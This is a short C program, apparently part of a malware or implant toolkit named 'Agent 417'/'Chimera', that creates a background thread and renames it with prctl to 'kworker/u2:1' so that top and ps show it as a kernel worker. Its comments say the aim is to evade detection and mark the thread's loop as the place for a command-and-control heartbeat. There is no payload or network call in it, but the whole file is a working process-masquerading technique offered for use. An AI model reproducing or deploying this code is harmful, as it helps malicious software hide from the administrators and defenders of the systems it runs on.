#include <stdio.h>
#include <pthread.h>
#include <sys/prctl.h>
#include <unistd.h>
#include <stdlib.h>

/* Agent 417: Thread Masquerading.
   Renames background worker threads to match kernel threads 
   and uses volatile execution to evade 'top -H' pattern matching.
*/

void* shadow_worker(void* arg) {
    // Military Grade: Rename the thread in the /proc/self/task/[tid]/comm file
    // This makes the thread appear as a kernel worker (kworker) to 'top' and 'ps'
    prctl(PR_SET_NAME, "kworker/u2:1", 0, 0, 0);

    while(1) {
        // Actual Chimera logic (e.g., C2 Heartbeat) goes here
        sleep(10); 
    }
    return NULL;
}

int main() {
    pthread_t thread_id;
    
    printf("--- [AGENT 417: THREAD MASQUERADE ACTIVE] ---\n");
    
    if(pthread_create(&thread_id, NULL, shadow_worker, NULL) != 0) {
        perror("pthread_create");
        return 1;
    }

    printf("[*] Worker birthed. Check 'top -H' or 'ps -eLf' for 'kworker/u2:1'\n");
    
    // Keep main thread alive
    while(1) { sleep(60); }
    
    return 0;
}
